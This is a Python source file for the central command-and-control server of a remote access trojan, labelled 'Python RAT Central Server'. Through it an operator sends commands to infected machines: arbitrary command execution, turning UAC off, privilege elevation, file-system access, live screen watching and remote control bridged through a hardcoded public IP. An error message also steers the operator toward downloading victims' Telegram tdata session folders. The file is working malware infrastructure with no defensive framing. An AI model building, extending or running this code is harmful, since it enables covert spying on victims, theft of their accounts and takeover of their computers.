import socket
import threading
import json
import queue
import secrets
import os
import time

# --- Configuration ---
CLIENT_IP = "0.0.0.0"
CLIENT_PORT = 3131
ADMIN_IP = "0.0.0.0"
ADMIN_PORT = 4131
PUBLIC_IP = "164.92.208.145" # Added for client connection back to server
TDATA_STORAGE_PATH = os.path.join(os.getcwd(), "files", "tdatas")
DB_PATH = 'db/admins.json'
# ---------------------

HEADER_LENGTH = 10

# --- State Management ---
clients = []
clients_lock = threading.Lock()
admin_conn = None
admin_lock = threading.Lock()
upload_tokens = {}
upload_tokens_lock = threading.Lock()
# -------------------------

# --- Raw Client Communication ---
def send_message(sock, message):
    """Prefixes message with a fixed-size header and sends."""
    try:
        message_bytes = message.encode('utf-8')
        header = f"{len(message_bytes):<{HEADER_LENGTH}}".encode('utf-8')
        sock.sendall(header + message_bytes)
        return True
    except (ConnectionResetError, BrokenPipeError):
        return False

def receive_message(sock):
    """Receives a message with a fixed-size header."""
    try:
        header = sock.recv(HEADER_LENGTH)
        if not header:
            return None
        message_length = int(header.decode('utf-8').strip())
        
        chunks = []
        bytes_recd = 0
        while bytes_recd < message_length:
            chunk = sock.recv(min(message_length - bytes_recd, 4096))
            if not chunk:
                return None # Connection broken
            chunks.append(chunk)
            bytes_recd += len(chunk)
        
        return b''.join(chunks).decode('utf-8', errors='ignore')
    except (ValueError, ConnectionResetError, BrokenPipeError):
        return None

# --- JSON Admin Communication ---
def send_json(sock, data):
    """Serializes data to JSON, prefixes with a header, and sends."""
    try:
        message = json.dumps(data)
        message_bytes = message.encode('utf-8')
        header = f"{len(message_bytes):<{HEADER_LENGTH}}".encode('utf-8')
        sock.sendall(header + message_bytes)
        return True
    except (ConnectionResetError, BrokenPipeError):
        return False

def receive_json(sock):
    """Receives a JSON message with a fixed-size header."""
    try:
        header = sock.recv(HEADER_LENGTH)
        if not header:
            return None
        message_length = int(header.decode('utf-8').strip())
        
        chunks = []
        bytes_recd = 0
        while bytes_recd < message_length:
            chunk = sock.recv(min(message_length - bytes_recd, 4096))
            if not chunk:
                return None
            chunks.append(chunk)
            bytes_recd += len(chunk)
        
        return json.loads(b''.join(chunks).decode('utf-8'))
    except (ValueError, ConnectionResetError, BrokenPipeError, json.JSONDecodeError):
        return None

def get_client_by_id(client_id):
    """Safely retrieves a client from the list by its ID (index)."""
    with clients_lock:
        try:
            if 0 <= client_id < len(clients):
                return clients[client_id]
        except (TypeError, IndexError):
            pass
    return None

def find_free_port(start_port=30000, end_port=40000):
    """Finds a free port on the server."""
    for port in range(start_port, end_port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if s.connect_ex(('127.0.0.1', port)) != 0:
                return port
    return None

class StreamBridge(threading.Thread):
    """Bridges two connections (Client and Admin) for streaming."""
    def __init__(self, port):
        super().__init__()
        self.port = port
        self.daemon = True
        self.client_conn = None
        self.admin_conn = None
        self.stop_event = threading.Event()

    def bridge(self, source, dest):
        try:
            while not self.stop_event.is_set():
                data = source.recv(40960)
                if not data: break
                dest.sendall(data)
        except:
            pass
        finally:
            self.stop_event.set()
            try: source.close()
            except: pass
            try: dest.close()
            except: pass

    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind(('0.0.0.0', self.port))
            sock.listen(2)
            sock.settimeout(30) # Wait 30s for both to connect

            # Accept two connections
            for _ in range(2):
                try:
                    conn, addr = sock.accept()
                    # Read handshake
                    conn.settimeout(5)
                    handshake = conn.recv(1024)
                    conn.settimeout(None)
                    
                    if b'rat_client' in handshake.lower():
                        self.client_conn = conn
                    elif b'rat_admin' in handshake.lower():
                        self.admin_conn = conn
                    else:
                        conn.close()
                except socket.timeout:
                    break
                except Exception as e:
                    print(f"[!] Bridge error accepting: {e}")
                    break
        except Exception as e:
            print(f"[!] Bridge logic failed: {e}")
        finally:
             sock.close() 

        if self.client_conn and self.admin_conn:
            # Bi-directional bridge for control support, though watch is mostly uni-directional
            t1 = threading.Thread(target=self.bridge, args=(self.client_conn, self.admin_conn), daemon=True)
            t2 = threading.Thread(target=self.bridge, args=(self.admin_conn, self.client_conn), daemon=True)
            t1.start(); t2.start()
            t1.join(); t2.join()
        else:
            if self.client_conn: self.client_conn.close()
            if self.admin_conn: self.admin_conn.close()

class AdminManager:
    def __init__(self, db_path):
        self.db_path = db_path
        self.admins = []
        self.lock = threading.Lock()
        self.load_admins()

    def load_admins(self):
        with self.lock:
            try:
                with open(self.db_path, 'r') as f:
                    self.admins = json.load(f)
            except (FileNotFoundError, json.JSONDecodeError):
                print(f"[!] Admin database '{self.db_path}' not found or corrupted. Please create it.")
                self.admins = []

    def save_admins(self):
        with self.lock:
            with open(self.db_path, 'w') as f:
                json.dump(self.admins, f, indent=2)

    def authenticate(self, username, password):
        with self.lock:
            for admin in self.admins:
                if admin['username'] == username and admin['password'] == password:
                    return admin
        return None

    def list_admins(self):
        with self.lock:
            return [{k: v for k, v in admin.items() if k != 'password'} for admin in self.admins]

    def add_admin(self, username, password, is_superadmin):
        with self.lock:
            if any(admin['username'] == username for admin in self.admins):
                return False, "Username already exists."
            
            new_id = max([admin['id'] for admin in self.admins] + [0]) + 1
            self.admins.append({
                "id": new_id,
                "username": username,
                "password": password,
                "is_superadmin": is_superadmin
            })
        self.save_admins()
        return True, "Admin added successfully."

    def delete_admin(self, username):
        with self.lock:
            original_len = len(self.admins)
            self.admins = [admin for admin in self.admins if admin['username'] != username]
            if len(self.admins) < original_len:
                self.save_admins()
                return True, "Admin deleted successfully."
        return False, "Admin not found."

    def update_password(self, username, new_password):
        with self.lock:
            for admin in self.admins:
                if admin['username'] == username:
                    admin['password'] = new_password
                    self.save_admins()
                    return True, "Password updated successfully."
        return False, "Admin not found."


# --- Core Logic ---
def handle_client_disconnect(client_info):
    """Handles client disconnection cleanly."""
    with clients_lock:
        if client_info in clients:
            clients.remove(client_info)
            try:
                client_info['conn'].close()
            except:
                pass
            print(f"[-] Client ({client_info['addr'][0]}) disconnected.")

def handle_client_connection(client_info):
    """Listens for messages from a single client and forwards them."""
    conn = client_info['conn']
    addr = client_info['addr']

    # --- Initial Handshake ---
    init_request = receive_json(conn)
    if not init_request or init_request.get("type") != "init":
        print(f"[!] Client from {addr[0]} failed handshake. Disconnecting.")
        handle_client_disconnect(client_info)
        return
    
    try:
        payload = init_request.get("data", {})
        with clients_lock:
            client_info['username'] = payload.get('username', 'Error')
            client_info['is_admin'] = payload.get('is_admin', 'Error')
            client_info['uac_status'] = payload.get('uac_status', 'Error')
    except Exception:
        print(f"[!] Client from {addr[0]} sent malformed handshake. Disconnecting.")
        handle_client_disconnect(client_info)
        return
    # -------------------------

    while True:
        response = receive_json(conn)
        if response is None:
            handle_client_disconnect(client_info)
            break

        # Intercept specific message types to update server state before forwarding
        if response.get("type") == "uac_response":
            with clients_lock:
                # Check if client is still connected before modifying
                if client_info in clients:
                    status = response.get("status")
                    detail = response.get("detail")
                    if status == "success":
                        if "ENABLED" in detail:
                            client_info['uac_status'] = 'ENABLED'
                        elif "DISABLED" in detail:
                            client_info['uac_status'] = 'DISABLED'
                    else: # Error case, revert the temporary status
                        if client_info.get('uac_status') == 'DISABLEING...':
                            client_info['uac_status'] = 'ENABLED'
                        elif client_info.get('uac_status') == 'ENABLEING...':
                            client_info['uac_status'] = 'DISABLED'

        # All messages from the client are now JSON and should be forwarded
        # to the admin if one is connected.
        with admin_lock:
            if admin_conn:
                current_client_id = -1
                with clients_lock:
                    try:
                        current_client_id = clients.index(client_info)
                    except ValueError:
                        pass # Client disconnected
                
                if current_client_id != -1:
                    # Add the client_id to the message before forwarding
                    response['client_id'] = current_client_id
                    send_json(admin_conn, response)

def accept_clients():
    """Listens for and accepts connections from clients."""
    global clients
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((CLIENT_IP, CLIENT_PORT))
    server_socket.listen(5)
    print(f"[+] Listening for clients on {CLIENT_IP}:{CLIENT_PORT}")

    while True:
        try:
            conn, addr = server_socket.accept()
            client_info = {
                'conn': conn,
                'addr': addr,
                'queue': queue.Queue(),
                'uac_status': 'Unknown',
                'is_admin': 'Unknown',
                'username': '<pending>',
                'connection_time': time.time()
            }
            with clients_lock:
                clients.append(client_info)
                client_id = len(clients) - 1
            print(f"[+] New client from {addr[0]}:{addr[1]} (ID: {client_id})")
            client_thread = threading.Thread(target=handle_client_connection, args=(client_info,), daemon=True)
            client_thread.start()
        except OSError:
            break

def handle_admin_connection(conn, addr):
    """Handles the entire lifecycle of a single admin connection."""
    global admin_conn
    with admin_lock:
        if admin_conn: # Should be handled by accept_admins, but as a safeguard
            send_json(conn, {"type": "auth_response", "status": "failed", "reason": "server_busy"})
            conn.close()
            return
        admin_conn = conn
    print(f"[+] Admin connected from {addr[0]}")

    current_admin = None
    try:
        # 1. Authentication
        auth_request = receive_json(conn)
        if auth_request and auth_request.get('action') == 'auth':
            current_admin = admin_manager.authenticate(auth_request.get('username'), auth_request.get('password'))

        if not current_admin:
            send_json(conn, {"type": "auth_response", "status": "failed"})
            print(f"[-] Failed auth attempt from {addr[0]}")
            # This delay prevents a race condition where the 'finally' block's conn.close()
            # signal reaches the client before the JSON message above has been fully
            # processed, which would cause a ConnectionAbortedError on the client's sock.recv().
            time.sleep(0.1)
            return

        send_json(conn, {"type": "auth_response", "status": "success", "is_superadmin": current_admin.get('is_superadmin', False)})
        print(f"[+] Admin '{current_admin['username']}' authenticated successfully.")

        # 2. Command Loop
        while True:
            request = receive_json(conn)
            if request is None:
                break

            action = request.get('action')
            is_superadmin = current_admin.get('is_superadmin', False)

            if action == 'list':
                with clients_lock:
                    client_list = [{
                        "id": idx,
                        "addr": f"{info['addr'][0]}:{info['addr'][1]}",
                        "uac_status": info.get('uac_status', 'Unknown'),
                        "is_admin": info.get('is_admin', 'Unknown'),
                        "username": info.get('username', 'N/A')
                    } for idx, info in enumerate(clients)]
                send_json(conn, {"type": "list_response", "data": client_list})

            elif action == 'list_admins':
                if not is_superadmin: continue
                admins_list = admin_manager.list_admins()
                output = "\n--- Admin Users ---\nID | Username     | Role\n" + "-"*28 + "\n"
                for admin in admins_list:
                    role = "Superadmin" if admin['is_superadmin'] else "Admin"
                    output += f"{admin['id']:<2} | {admin['username']:<12} | {role}\n"
                send_json(conn, {"type": "admin_response", "message": output})

            elif action == 'add_admin':
                if not is_superadmin: continue
                success, message = admin_manager.add_admin(
                    request.get('username'),
                    request.get('password'),
                    request.get('is_superadmin', False)
                )
                send_json(conn, {"type": "admin_response", "message": message})

            elif action == 'del_admin':
                if not is_superadmin: continue
                target_user = request.get('username')
                if target_user == current_admin['username']:
                    send_json(conn, {"type": "admin_response", "message": "Cannot delete yourself."})
                else:
                    success, message = admin_manager.delete_admin(target_user)
                    send_json(conn, {"type": "admin_response", "message": message})

            elif action == 'edit_admin': # Password change
                if not is_superadmin: continue
                success, message = admin_manager.update_password(
                    request.get('username'), request.get('new_password')
                )
                send_json(conn, {"type": "admin_response", "message": message})

            elif action == 'exec':
                client_id = request.get('client_id')
                payload = request.get('payload')
                client_info = get_client_by_id(client_id)
                
                if client_info:
                    if send_json(client_info['conn'], {"action": "exec", "payload": payload}):
                        try:
                            # Wait up to 10 seconds for a response from the client's queue
                            # The response will now come asynchronously to the admin's listener thread
                            pass # No longer waiting here
                        except queue.Empty:
                            send_json(conn, {"type": "error", "message": f"Command timed out for client {client_id}."})
                    else:
                        # handle_client_disconnect(client_info) # Let the listener thread handle it
                        send_json(conn, {"type": "error", "message": f"Failed to send command to client {client_id}."})
                else:
                    send_json(conn, {"type": "error", "message": f"Client {client_id} not found."})

            elif action == 'uac':
                client_id = request.get('client_id')
                level = request.get('level')

                if client_id is None or level not in ['enable', 'disable']:
                    send_json(conn, {"type": "error", "message": "Invalid UAC command parameters."})
                    continue

                client_info = get_client_by_id(client_id)

                if client_info:
                    uac_request = {"action": "uac", "payload": {"level": level}}
                    if send_json(client_info['conn'], uac_request):
                        # Response will be handled by the async listener
                        pass
                    else:
                        send_json(conn, {"type": "error", "message": f"Failed to send UAC command to client {client_id}."})
                    # Update stored status based on async response in admin console later
                    # For now, we can tentatively update it.
                    with clients_lock:
                        if client_info in clients:
                            client_info['uac_status'] = level.upper() + 'ING...'
                else:
                    send_json(conn, {"type": "error", "message": f"Client {client_id} not found."})

            elif action == 'su':
                client_id = request.get('client_id')
                client_info = get_client_by_id(client_id)

                if client_info:
                    if send_json(client_info['conn'], {"action": "su"}):
                        # Response handled asynchronously
                        pass
                    else:
                        send_json(conn, {"type": "error", "message": f"Failed to send su command to client {client_id}."})
                else:
                    send_json(conn, {"type": "error", "message": f"Client {client_id} not found."})

            elif action == 'get_network_info':
                client_id = request.get('client_id')
                client_info = get_client_by_id(client_id)
                
                if client_info:
                    if not send_json(client_info['conn'], {"action": "get_network_info"}):
                        send_json(conn, {"type": "error", "message": f"Failed to send command to client {client_id}."})
                else:
                    send_json(conn, {"type": "error", "message": f"Client {client_id} not found."})

            elif action == 'tg':
                client_id = request.get('client_id')
                admin_ip = addr[0]
                client_info = get_client_by_id(client_id) # This is redundant
                
                if client_info:
                    token = secrets.token_hex(16)
                    with upload_tokens_lock:
                        upload_tokens[token] = {
                            "client_id": client_id,
                            "status": "pending",
                            "timestamp": time.time()
                        }
                    
                    # This functionality is not part of the new FS API, so it's removed for simplicity.
                    # A proper implementation would use the new fs_put API to upload the archive.
                    # For now, we will disable it to align with the refactoring goal.
                    send_json(conn, {"type": "error", "message": "tg command is deprecated. Use file explorer to find and download tdata folder."})
                else:
                    send_json(conn, {"type": "error", "message": f"Client {client_id} not found."})

            elif action.startswith('fs_'):
                client_id = request.get('client_id')
                client_info = get_client_by_id(client_id)
                if client_info:
                    if not send_json(client_info['conn'], request):
                        send_json(conn, {"type": "error", "message": f"Failed to send FS command to client {client_id}."})
                else:
                    send_json(conn, {"type": "error", "message": f"Client {client_id} not found."})

            elif action == 'initiate_watch':
                client_id = request.get('client_id')
                # stream_port (from admin) is ignored now; server decides port
                fps = request.get('fps')
                quality = request.get('quality')
                capture_cursor = request.get('capture_cursor', True)
                
                client_info = get_client_by_id(client_id)

                if client_info:
                    # Start Bridge
                    bridge_port = find_free_port()
                    if bridge_port:
                        bridge = StreamBridge(bridge_port)
                        bridge.start()
                        
                        # Tell Client
                        watch_request = {
                            "action": "watch_start",
                            "payload": {
                                "ip": PUBLIC_IP,
                                "port": bridge_port,
                                "fps": fps,
                                "quality": quality,
                                "capture_cursor": capture_cursor
                            }
                        }
                        if not send_json(client_info['conn'], watch_request):
                            send_json(conn, {"type": "error", "message": f"Failed to send watch command to client {client_id}."})
                        else:
                            # Tell Admin
                            send_json(conn, {"type": "watch_ready", "port": bridge_port, "client_id": client_id})
                    else:
                         send_json(conn, {"type": "error", "message": "No free ports on server."})

                else:
                    send_json(conn, {"type": "error", "message": f"Client {client_id} not found."})

            elif action == 'initiate_control':
                client_id = request.get('client_id')
                # Ports ignored
                client_info = get_client_by_id(client_id)

                if client_info:
                    s_port = find_free_port()
                    c_port = find_free_port(s_port + 1)
                    
                    if s_port and c_port:
                        s_bridge = StreamBridge(s_port)
                        c_bridge = StreamBridge(c_port)
                        s_bridge.start()
                        c_bridge.start()

                        control_request = {
                            "action": "control_start",
                            "payload": {
                                "ip": PUBLIC_IP,
                                "stream_port": s_port,
                                "control_port": c_port
                            }
                        }
                        if not send_json(client_info['conn'], control_request):
                            send_json(conn, {"type": "error", "message": f"Failed to send control command to client {client_id}."})
                        else:
                            send_json(conn, {"type": "control_ready", "stream_port": s_port, "control_port": c_port, "client_id": client_id})
                    else:
                        send_json(conn, {"type": "error", "message": "No free ports on server."})
                else:
                    send_json(conn, {"type": "error", "message": f"Client {client_id} not found."})

    finally:
        print(f"[-] Admin from {addr[0]} disconnected.")
        with admin_lock:
            admin_conn = None
        conn.close()

def accept_admins():
    """Listens for and accepts a single admin connection."""
    admin_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    admin_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    admin_socket.bind((ADMIN_IP, ADMIN_PORT))
    admin_socket.listen(1)
    print(f"[+] Listening for an admin on {ADMIN_IP}:{ADMIN_PORT}")

    while True:
        conn, addr = admin_socket.accept()
        with admin_lock:
            if admin_conn is not None:
                print(f"[-] Rejecting new admin from {addr[0]}; an admin is already connected.")
                send_json(conn, {"type": "auth_response", "status": "failed", "reason": "server_busy"})
                conn.close()
                continue
        
        admin_thread = threading.Thread(target=handle_admin_connection, args=(conn, addr), daemon=True)
        admin_thread.start()

def main():
    print("--- Python RAT Central Server ---")
    
    client_thread = threading.Thread(target=accept_clients, daemon=True)
    client_thread.start()

    admin_thread = threading.Thread(target=accept_admins, daemon=True)
    admin_thread.start()

    # Keep the main thread alive
    global admin_manager
    admin_manager = AdminManager(DB_PATH)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Shutting down server.")

if __name__ == "__main__":
    main()

